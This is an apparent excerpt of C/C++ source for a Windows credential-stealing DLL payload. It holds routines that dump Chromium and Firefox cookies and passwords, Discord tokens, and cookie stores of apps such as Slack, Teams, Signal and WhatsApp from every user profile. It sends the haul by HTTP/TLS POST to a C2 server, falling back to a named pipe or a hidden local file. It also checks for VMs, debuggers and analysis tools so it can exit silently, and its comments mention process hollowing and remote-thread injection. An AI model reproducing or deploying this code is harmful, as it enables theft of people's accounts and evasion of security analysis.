    DbgStr("ExfilHTTP: path=", path);
    Dbg(tls ? "ExfilHTTP: transport=TLS" : "ExfilHTTP: transport=HTTP");

    HMODULE ws2 = LoadLibraryA("ws2_32.dll");
    if(!ws2){ Dbg("ExfilHTTP: ws2_32.dll load FAILED"); return false; }
    typedef int (WINAPI *tWSAStartup)(unsigned short, void*);
    typedef CK_SOCKET (WINAPI *tSocket)(int,int,int);
    typedef int (WINAPI *tConnect)(CK_SOCKET, const void*, int);
    typedef int (WINAPI *tCloseSocket)(CK_SOCKET);
    typedef int (WINAPI *tWSACleanup)(void);
    typedef unsigned long (WINAPI *tInetAddr)(const char*);
    typedef int (WINAPI *tSetSockOpt)(CK_SOCKET, int, int, const char*, int);
    typedef int (WINAPI *tGetSockOpt)(CK_SOCKET, int, int, char*, int*);
    typedef int (WINAPI *tIoctlSocket)(CK_SOCKET, long, unsigned long*);
    typedef int (WINAPI *tSelect)(int, CK_FD_SET*, CK_FD_SET*, CK_FD_SET*, const CK_TIMEVAL*);
    typedef int (WINAPI *tWsaErr)(void);
    typedef struct CK_HOSTENT* (WINAPI *tGethostbyname)(const char*);
    tWSAStartup fStart = (tWSAStartup)GetProcAddress(ws2,"WSAStartup");
    tSocket    fSocket = (tSocket)GetProcAddress(ws2,"socket");
    tConnect   fConnect= (tConnect)GetProcAddress(ws2,"connect");
    tCkSend    fSend   = (tCkSend)GetProcAddress(ws2,"send");
    tCkRecv    fRecv   = (tCkRecv)GetProcAddress(ws2,"recv");
    tCloseSocket fClose= (tCloseSocket)GetProcAddress(ws2,"closesocket");
    tWSACleanup fClean = (tWSACleanup)GetProcAddress(ws2,"WSACleanup");
    tInetAddr  fInet  = (tInetAddr)GetProcAddress(ws2,"inet_addr");
    tSetSockOpt fSetOpt= (tSetSockOpt)GetProcAddress(ws2,"setsockopt");
    tGetSockOpt fGetOpt= (tGetSockOpt)GetProcAddress(ws2,"getsockopt");
    tIoctlSocket fIoctl= (tIoctlSocket)GetProcAddress(ws2,"ioctlsocket");
    tSelect    fSelect= (tSelect)GetProcAddress(ws2,"select");
    tWsaErr    fErr   = (tWsaErr)GetProcAddress(ws2,"WSAGetLastError");
    tGethostbyname fGetHost = (tGethostbyname)GetProcAddress(ws2,"gethostbyname");
    if(!fStart||!fSocket||!fConnect||!fSend||!fRecv||!fClose||!fInet){
        Dbg("ExfilHTTP: missing ws2_32 exports"); return false;
    }

    CK_WSADATA wsaData;
    if(fStart(0x0202, &wsaData)){ Dbg("ExfilHTTP: WSAStartup failed"); return false; }

    CK_SOCKADDR_IN addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = 2;
    addr.sin_port = (unsigned short)(((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
    addr.sin_addr = fInet(host);
    if(addr.sin_addr == 0xFFFFFFFF){
        struct CK_HOSTENT* he = fGetHost ? fGetHost(host) : 0;
        if(he && he->h_addr_list && he->h_addr_list[0]){
            memcpy(&addr.sin_addr, he->h_addr_list[0], 4);
        } else {
            Dbg("ExfilHTTP: name resolution failed"); fClean(); return false;
        }
    }

    // Split on record boundaries. Each chunk is a complete {"records":[...]}
    // envelope; only the last carries the coverage object.
    int chunk_total = 0;
    if(g_rec_n <= 0) chunk_total = 1;
    else for(int k = 0; k < g_rec_n; ){ k = ChunkEnd(k); chunk_total++; }
    DbgInt("ExfilHTTP: chunks", chunk_total);

    const char prefix[] = "{\"records\":[";
    const int prefix_len = 12;
    bool sent_ok = true;
    int i = 0, chunk_idx = 0;
    for(;;){
        bool last;
        const char* slice; int slice_len;
        const char* suffix; int suffix_len;
        if(g_rec_n <= 0){
            last = true;
            slice = g_out + g_rec_end; slice_len = 0;
            suffix = g_out + g_rec_end; suffix_len = (int)(g_len - g_rec_end);
        } else {
            int j = ChunkEnd(i);
            last = (j >= g_rec_n);
            size_t slice_end = last ? g_rec_end : (g_rec_off[j] - 1);
            slice = g_out + g_rec_off[i];
            slice_len = (int)(slice_end - g_rec_off[i]);
            if(last){ suffix = g_out + g_rec_end; suffix_len = (int)(g_len - g_rec_end); }
            else { suffix = "]}"; suffix_len = 2; }
            i = j;
        }
        size_t body_len = (size_t)prefix_len + (size_t)slice_len + (size_t)suffix_len;
        char hdr[1024];
        int hn = BuildPostHeader(hdr, sizeof(hdr), host, port, path, body_len, tls, chunk_idx, chunk_total);

        bool chunk_ok = false;
        for(int attempt = 0; attempt < 4 && !chunk_ok; attempt++){
            if(attempt) Sleep(500u << (attempt - 1));      // 500, 1000, 2000 ms
            CK_SOCKET s = fSocket(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 6 /*IPPROTO_TCP*/);
            if(s == CK_INVALID_SOCKET){ Dbg("ExfilHTTP: socket failed"); continue; }
            if(fSetOpt){
                DWORD tmo = 30000;
                fSetOpt(s, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
                fSetOpt(s, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
            }
            bool connected = false;
            if(fIoctl && fSelect && fGetOpt && fErr){
                unsigned long nb = 1;
                fIoctl(s, (long)0x8004667E /*FIONBIO*/, &nb);
                int cr = fConnect(s, &addr, sizeof(addr));
                if(cr == 0) connected = true;
                else if(cr == -1 && fErr() == 10035 /*WSAEWOULDBLOCK*/){
                    CK_FD_SET wr; memset(&wr, 0, sizeof(wr));
                    wr.fd_count = 1; wr.fd_array[0] = s;
                    CK_TIMEVAL tv; tv.tv_sec = 5; tv.tv_usec = 0;
                    if(fSelect(0, 0, &wr, 0, &tv) > 0){
                        int soerr = 0, sl = (int)sizeof(soerr);
                        if(fGetOpt(s, 0xFFFF, 0x1007 /*SO_ERROR*/, (char*)&soerr, &sl) == 0 && soerr == 0)
                            connected = true;
                    }
                }
                unsigned long blocking = 0;
                fIoctl(s, (long)0x8004667E, &blocking);
            } else {
                connected = (fConnect(s, &addr, sizeof(addr)) == 0);
            }
            if(!connected){
                DbgInt("ExfilHTTP: connect failed (attempt)", attempt);
                fClose(s); continue;
            }
            Dbg("ExfilHTTP: connected");

            CkTls tlsctx;
            if(tls){
                if(!TlsHandshake(&tlsctx, s, host, fSend, fRecv)){
                    Dbg("ExfilHTTP: TLS handshake failed");
                    TlsTeardown(&tlsctx, s, fSend, false);
                    fClose(s); continue;
                }
                Dbg("ExfilHTTP: TLS ready");
            }

            bool ok;
            if(tls){
                ok = TlsSend(&tlsctx, fSend, s, hdr, hn) &&
                     TlsSend(&tlsctx, fSend, s, prefix, prefix_len) &&
                     (slice_len <= 0 || TlsSend(&tlsctx, fSend, s, slice, slice_len)) &&
                     TlsSend(&tlsctx, fSend, s, suffix, suffix_len);
            } else {
                ok = SendAll(fSend, s, hdr, hn) &&
                     SendAll(fSend, s, prefix, prefix_len) &&
                     (slice_len <= 0 || SendAll(fSend, s, slice, slice_len)) &&
                     SendAll(fSend, s, suffix, suffix_len);
            }
            bool acked = false;
            if(ok){
                if(tls) acked = TlsRecvStatus(&tlsctx, fRecv, s);
                else    acked = RecvStatus(fRecv, s);
                if(!acked) Dbg("ExfilHTTP: no 200 ack");
            }
            if(tls) TlsTeardown(&tlsctx, s, fSend, ok && acked);
            fClose(s);
            chunk_ok = ok && acked;
            if(!chunk_ok) DbgInt("ExfilHTTP: chunk attempt failed", attempt);
        }
        if(!chunk_ok){ sent_ok = false; break; }
        chunk_idx++;
        if(last) break;
    }
    fClean();
    return sent_ok;
}

// ------------------------------------------------------------------ exfiltration sink
// Stage-2 wire shape: {"records":[...],"coverage":{...}}. The listener accepts
// both this and the bare list, so an old payload still lands.
static long long NowUnix(void){
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    unsigned long long t = ((unsigned long long)ft.dwHighDateTime<<32) | ft.dwLowDateTime;
    return (long long)(t/10000000ULL) - 11644473600LL;
}

static void EmitCoverage(void){
    VictimName();
    PutS(",\"coverage\":{\"ts\":"); PutN(NowUnix());
    PutS(",\"host\":"); PutJ(g_victim, lstrlenA(g_victim));
    // run id: pid is enough to tell two executions apart on one host
    PutS(",\"run\":\"r"); PutN((long long)GetCurrentProcessId()); PutS("\"");
    PutS(",\"sources\":[");
    for(int i=0;i<g_src_n;i++){
        SrcRow* s=&g_src[i];
        if(i) PutS(",");
        PutS("{\"kind\":");       PutJ(s->kind,    lstrlenA(s->kind));
        PutS(",\"browser\":");    PutJ(s->browser, lstrlenA(s->browser));
        PutS(",\"profile\":");    PutJ(s->profile, lstrlenA(s->profile));
        PutS(",\"path\":");       PutJ(s->path,    lstrlenA(s->path));
        PutS(",\"rows\":");       PutN(s->rows);
        PutS(",\"decrypted\":");  PutN(s->dec);
        PutS(",\"failed\":");     PutN(s->failed);
        PutS(",\"skipped\":");    PutJ(s->skip,    lstrlenA(s->skip));
        PutS("}");
    }
    PutS("]}}");
}

// Priority: 1) HTTP POST to C2 (if sentinel was patched), 2) named pipe, 3) local file
static bool Sink(void){
    g_rec_end = g_len;                                  // chunk splitter stops here
    PutS("]");
    EmitCoverage();
    if(g_out) g_out[g_len]=0; else return false;   // nothing was ever buffered (OOM)

    // 1. If C2 URL is configured (sentinel replaced by pick.py), exfiltrate via HTTP
    bool is_c2_configured = (g_c2_url[0]!='C' || g_c2_url[1]!='K' || g_c2_url[2]!='C' || g_c2_url[3]!='2');
    if(is_c2_configured){
        Dbg("Sink: exfiltrating via HTTP");
        bool ok = ExfilHTTP(g_c2_url);
        Dbg(ok?"Sink: HTTP OK":"Sink: HTTP FAILED");
        if(ok) return true;
        // fall through to local fallback if HTTP fails
    } else {
        Dbg("Sink: no C2 URL configured, skipping HTTP");
    }

    // 2. Fallback: named pipe (if sink.py is running locally)
    for(int i=0;i<20;i++){
        HANDLE p = CreateFileW(L"\\\\.\\pipe\\ck_pipe",GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
        if(p!=INVALID_HANDLE_VALUE){
            // WriteFile on a pipe can return short; the old single call dropped
            // the tail of any dump bigger than one pipe buffer and reported fail
            DWORD wrote=0; bool ok=true;
            while(wrote < (DWORD)g_len){
                DWORD w=0;
                if(!WriteFile(p,g_out+wrote,(DWORD)g_len-wrote,&w,NULL) || w==0){ ok=false; break; }
                wrote += w;
            }
            CloseHandle(p);
            if(ok) return true;
        }
        Sleep(250);
    }

    // 3. Last resort: local file
    CreateDirectoryW(L"C:\\ProgramData\\MediaCache",NULL);
    HANDLE h = CreateFileW(L"C:\\ProgramData\\MediaCache\\cache.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
    if(h==INVALID_HANDLE_VALUE)
        h = CreateFileW(L"_ck_drop.json",GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
    if(h==INVALID_HANDLE_VALUE) return false;
    DWORD wr=0; WriteFile(h,g_out,(DWORD)g_len,&wr,NULL); CloseHandle(h); return true;
}

// ------------------------------------------------------------------ anti-analysis
// Returns true if the payload appears to be running in a VM or sandbox.
// If so, the payload exits silently without extracting cookies.
static bool IsAnalysisEnv(void){
    // Check anti-VM skip sentinel (patched to "CKAV0001" by --no-anti-vm)
    if(g_skip_av[4]=='0' && g_skip_av[5]=='0' && g_skip_av[6]=='0' && g_skip_av[7]=='1'){
        Dbg("IsAnalysisEnv: SKIPPED (CKAV0001 — anti-VM disabled)");
        return false;
    }
    Dbg("IsAnalysisEnv: checking");

    // 1. Check for known VM MAC address prefixes on PHYSICAL adapters only.
    // Skip virtual adapters (WSL, Hyper-V virtual switch, VPN) to avoid false positives.
    // VMware: 00:0C:29, 00:50:56, 00:05:69
    // VirtualBox: 08:00:27, 0A:00:27
    // QEMU: 52:54:00
    // (Hyper-V 00:15:5D excluded â€” WSL creates a Hyper-V virtual adapter on real machines)
    IP_ADAPTER_INFO adapter[16];
    ULONG bufLen = sizeof(adapter);
    HMODULE iphlp = LoadLibraryA("iphlpapi.dll");
    if(iphlp){
        typedef DWORD (WINAPI *tGetAdapters)(void*, ULONG*);
        tGetAdapters fGet = (tGetAdapters)GetProcAddress(iphlp, "GetAdaptersInfo");
        if(fGet){
            DWORD rc = fGet(adapter, &bufLen);
            if(rc == 0){
                PIP_ADAPTER_INFO p = adapter;
                while(p){
                    // Only check Ethernet (type 6) and Wireless (type 71) adapters.
                    // Skip type 1 (Loopback), type 53 (propvirtual), type 131 (tunnel).
                    // This filters out WSL, VPN, and virtual tunnel adapters.
                    if(p->Type != 6 && p->Type != 71){
                        p = p->Next;
                        continue;
                    }
                    // Skip adapters with "Virtual" or "WSL" in the description
                    bool isVirtual = false;
                    const char* desc = p->Description;
                    if(desc){
                        // Check for "Virtual", "WSL", "Hyper-V" in description
                        for(const char* s = desc; s[0]; s++){
                            if((s[0]=='V'||s[0]=='v') && (s[1]=='i'||s[1]=='I') &&
                               (s[2]=='r'||s[2]=='R') && (s[3]=='t')){ isVirtual=true; break; }
                            if(s[0]=='W' && s[1]=='S' && s[2]=='L'){ isVirtual=true; break; }
                        }
                    }
                    if(isVirtual){ p = p->Next; continue; }
                    if(p->AddressLength >= 3){
                        unsigned char* mac = p->Address;
                        if((mac[0]==0x00 && mac[1]==0x0C && mac[2]==0x29) ||  // VMware
                           (mac[0]==0x00 && mac[1]==0x50 && mac[2]==0x56) ||  // VMware
                           (mac[0]==0x08 && mac[1]==0x00 && mac[2]==0x27) ||  // VirtualBox
                           (mac[0]==0x52 && mac[1]==0x54 && mac[2]==0x00)){    // QEMU
                            Dbg("IsAnalysisEnv: VM MAC detected (physical adapter)");
                            FreeLibrary(iphlp);
                            return true;
                        }
                    }
                    p = p->Next;
                }
            }
        }
        FreeLibrary(iphlp);
    }
    Dbg("IsAnalysisEnv: no VM MAC (physical adapters only)");

    // 2. Check for debugger (IsDebuggerPresent + CheckRemoteDebuggerPresent)
    // These are in kernel32.dll which is already loaded
    typedef BOOL (WINAPI *tIsDbg)(void);
    typedef BOOL (WINAPI *tCheckDbg)(HANDLE, PBOOL);
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    if(k32){
        tIsDbg fIsDbg = (tIsDbg)GetProcAddress(k32, "IsDebuggerPresent");
        if(fIsDbg && fIsDbg()){
            Dbg("IsAnalysisEnv: debugger detected (IsDebuggerPresent)");
            return true;
        }
        tCheckDbg fCheckDbg = (tCheckDbg)GetProcAddress(k32, "CheckRemoteDebuggerPresent");
        if(fCheckDbg){
            BOOL remote = FALSE;
            HANDLE proc = GetCurrentProcess();
            if(fCheckDbg(proc, &remote) && remote){
                Dbg("IsAnalysisEnv: debugger detected (CheckRemoteDebuggerPresent)");
                return true;
            }
        }
    }
    Dbg("IsAnalysisEnv: no debugger");

    // 3. Check for common analysis process names
    const char* procs[] = { "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "windbg.exe",
                            "ida.exe", "ida64.exe", "idaq.exe", "idaq64.exe",
                            "immunitydebugger.exe", "wireshark.exe", "fiddler.exe",
                            "processhacker.exe", "procmon.exe", "procexp.exe",
                            "tcpdump.exe", "dumpcap.exe" };
    HANDLE snap = CreateToolhelp32Snapshot(0x00000002 /*TH32CS_SNAPPROCESS*/, 0);
    if(snap != INVALID_HANDLE_VALUE){
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        typedef BOOL (WINAPI *tFirst)(HANDLE, void*);
        typedef BOOL (WINAPI *tNext)(HANDLE, void*);
        // Use Process32FirstW/NextW from kernel32 (already loaded)
        HMODULE k32 = GetModuleHandleA("kernel32.dll");
        tFirst fFirst = (tFirst)GetProcAddress(k32, "Process32FirstW");
        tNext  fNext  = (tNext)GetProcAddress(k32, "Process32NextW");
        if(fFirst && fNext && fFirst(snap, &pe)){
            do {
                // Convert wide name to lowercase ASCII for comparison
                char name[260]; int j=0;
                for(; j<259 && pe.szExeFile[j]; j++){
                    wchar_t c = pe.szExeFile[j];
                    name[j] = (c >= 'A' && c <= 'Z') ? (char)(c + 32) : (char)c;
                }
                name[j] = 0;
                for(unsigned i=0; i<sizeof(procs)/sizeof(procs[0]); i++){
                    // Simple suffix match
                    int pl = lstrlenA(procs[i]); int nl = lstrlenA(name);
                    if(nl >= pl && lstrcmpiA(name + nl - pl, procs[i]) == 0){
                        DbgStr("IsAnalysisEnv: analysis process detected: ", name);
                        CloseHandle(snap);
                        return true;
                    }
                }
            } while(fNext(snap, &pe));
        }
        CloseHandle(snap);
    }
    Dbg("IsAnalysisEnv: no analysis processes");

    // Only do timing check if not in a known VM environment (to avoid false positives)
    // Skip timing check as it can cause false positives on loaded systems
    Dbg("IsAnalysisEnv: timing check skipped (avoid false positives)");

    return false;
}

// rundll32 calls this after LoadLibrary (which already triggered payload_entry via DLL_PROCESS_ATTACH).
// This noop exists only so rundll32 doesn't complain about a missing export.
extern "C" __declspec(dllexport) void CALLBACK noop(HWND, HINSTANCE, LPSTR, int) {}

// diagnostic build entry: LoadLibrary binds imports and runs THIS instead of the
// full payload_entry, which the probe then calls manually under an SEH frame to
// pinpoint crashes without the loader lock swallowing the exception
extern "C" __declspec(dllexport) DWORD WINAPI entry_stub(void*, unsigned long, void*){ return 1; }

// Curated CEF/Electron stores. These are Chromium userData roots: a Cookies
// database at the root (older Electron) or under Network\Cookies, plus
// profile-like subdirectories. Discord/Slack/Teams/Spotify/Notion/Obsidian/
// VS Code/Signal/Element/WhatsApp/Steam all keep a decryptable jar here.
struct CefApp { const wchar_t* name; const wchar_t* rel; const wchar_t* exe; };
static CefApp g_cef[] = {
    {L"discord",   L"\\discord",                                                    L"discord.exe"},
    {L"slack",     L"\\Slack",                                                      L"slack.exe"},
    {L"teams",     L"\\Microsoft\\Teams",                                           L"Teams.exe"},
    {L"teams-msix",L"\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\EBWebView", L"ms-teams.exe"},
    {L"spotify",   L"\\Spotify",                                                    L"Spotify.exe"},
    {L"notion",    L"\\Notion",                                                     L"Notion.exe"},
    {L"obsidian",  L"\\Obsidian",                                                   L"Obsidian.exe"},
    {L"vscode",    L"\\Code",                                                       L"Code.exe"},
    {L"signal",    L"\\Signal",                                                     L"Signal.exe"},
    {L"element",   L"\\Element",                                                    L"Element.exe"},
    {L"whatsapp",  L"\\WhatsApp",                                                   L"WhatsApp.exe"},
    {L"steam",     L"\\Steam\\htmlcache",                                           L"steamwebhelper.exe"},
};

static void DumpCefStores(const wchar_t* la, const wchar_t* aa, bool notice){
    for(unsigned i=0;i<sizeof(g_cef)/sizeof(g_cef[0]);i++){
        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_cef[i].rel);
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
            lstrcpyW(root,aa); lstrcatW(root,g_cef[i].rel);
        }
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
            if(notice){
                wchar_t miss[1024]; lstrcpyW(miss,la); lstrcatW(miss,g_cef[i].rel);
                SrcAdd("cef",L"",g_cef[i].name,miss,0,0,0,"missing");
            }
            continue;
        }
        Dbg("DumpCefStores: found store");
        LoadLocalState(g_cef[i].name, root);
        DumpChromium(g_cef[i].name, root, g_cef[i].exe, "cef");
        DumpPasswords(g_cef[i].name, root, g_cef[i].exe);
    }
}

// One (local, roaming) pair = one Windows profile. Dumping a single pair was
// enough while the payload ran as the user; a SYSTEM payload sees only
// systemprofile under %LOCALAPPDATA%, where no browser has ever run, so the user
// profiles have to be enumerated (same reason cookielog.py walks C:\Users).
// notice: emit "missing" coverage rows once, on the first roots pass only.
static void DumpRoots(const wchar_t* la, const wchar_t* aa, bool notice){
    for(unsigned i=0;i<sizeof(g_br)/sizeof(g_br[0]);i++){
        wchar_t root[1024]; lstrcpyW(root,la); lstrcatW(root,g_br[i].rel);
        wchar_t alt[1024];  lstrcpyW(alt,aa);  lstrcatW(alt,g_br[i].rel);
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES) lstrcpyW(root,alt);
        if(GetFileAttributesW(root)==INVALID_FILE_ATTRIBUTES){
            if(notice) SrcAdd("chromium", g_br[i].name, L".", root, 0, 0, 0, "missing");
            continue;
        }
        Dbg("payload_entry: found chromium profile");
        LoadLocalState(g_br[i].name, root);
        DumpChromium(g_br[i].name,root,g_br[i].exe,"chromium");
        DumpPasswords(g_br[i].name,root,g_br[i].exe);
    }
    Dbg("payload_entry: before DumpFirefox");
    DumpFirefox(aa, notice);
    Dbg("payload_entry: after DumpFirefox");
    Dbg("payload_entry: before DumpDiscordTokens");
    DumpDiscordTokens(aa);
    Dbg("payload_entry: after DumpDiscordTokens");
    DumpCefStores(la, aa, notice);
}

extern "C" __declspec(dllexport) DWORD WINAPI payload_entry(HINSTANCE h, DWORD reason, LPVOID)
{
#ifdef DEBUG
    g_imgbase = (void*)h;
    AddVectoredExceptionHandler(1, CrashVEH);
#endif
    Dbg("payload_entry: start");
    // Anti-analysis: exit silently if VM/sandbox/debugger detected.
    // Return 1: a 0 return makes LoadLibrary fail with 1114 and rundll32 pop an error box.
    if(IsAnalysisEnv()){
        Dbg("payload_entry: analysis environment detected, exiting");
        return 1;
    }
    Dbg("payload_entry: anti-analysis checks passed");
    // LoadLibrary calls: hinst=base, reason=DLL_PROCESS_ATTACH(1), reserved=NULL
    // CreateRemoteThread calls: hinst=arg(1), reason=undefined, reserved=undefined
    // Accept both: reason==1 (LoadLibrary) or h==1 (CreateRemoteThread arg=1)
    if(reason != 1 && (ULONG_PTR)h != 1){ Dbg("payload_entry: not ATTACH, skip"); return 1; }
    g_first_rec = true;
    g_rec_n = 0;
    g_rec_end = 0;
    Dbg("payload_entry: loading sqlite");
    if(!Sqlite()){ Dbg("payload_entry: Sqlite FAILED"); return 1; }
    Dbg("payload_entry: Sqlite OK");
    // The hollowed process doesn't have crypt32.dll/bcrypt.dll/ws2_32.dll loaded by default.
    // Preload them so IAT addresses resolve (same-session ASLR uses same base in all processes).
    LoadLibraryA("crypt32.dll");
    LoadLibraryA("bcrypt.dll");
    LoadLibraryA("ws2_32.dll");
    LoadLibraryA("secur32.dll");
    wchar_t la[1024], aa[1024];
    bool have_la = GetEnvironmentVariableW(L"LOCALAPPDATA",la,1024) != 0;
    bool have_aa = GetEnvironmentVariableW(L"APPDATA",aa,1024) != 0;
    if(!have_la || !have_aa){ Dbg("payload_entry: no LOCALAPPDATA/APPDATA"); return 2; }
    Dbg("payload_entry: env OK, dumping");
    PutS("{\"records\":[");
    Dbg("payload_entry: after PutS(records[, entering chromium loop");
    DumpRoots(la, aa, true);
    // SYSTEM: the user profiles are not reachable through the environment, so
    // enumerate C:\Users. Duplicate roots are skipped to avoid re-dumping.
    WIN32_FIND_DATAW fd;
    HANDLE u = FindFirstFileW(L"C:\\Users\\*", &fd);
    if(u != INVALID_HANDLE_VALUE){
        do{
            if(!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if(fd.cFileName[0] == L'.') continue;
            wchar_t ul[1024], ua[1024];
            lstrcpyW(ul, L"C:\\Users\\"); lstrcatW(ul, fd.cFileName);
            lstrcatW(ul, L"\\AppData\\Local");
            lstrcpyW(ua, L"C:\\Users\\"); lstrcatW(ua, fd.cFileName);
            lstrcatW(ua, L"\\AppData\\Roaming");
            if(lstrcmpiW(ul,la)==0 && lstrcmpiW(ua,aa)==0) continue;
            if(GetFileAttributesW(ul)==INVALID_FILE_ATTRIBUTES) continue;
            Dbg("payload_entry: dumping another user profile");
            DumpRoots(ul, ua, false);
        } while(FindNextFileW(u, &fd));
        FindClose(u);
    }
    Dbg("payload_entry: extraction done, calling Sink");
    bool ok=Sink();
    Dbg(ok?"payload_entry: Sink OK":"payload_entry: Sink FAILED");
    return 0;
}
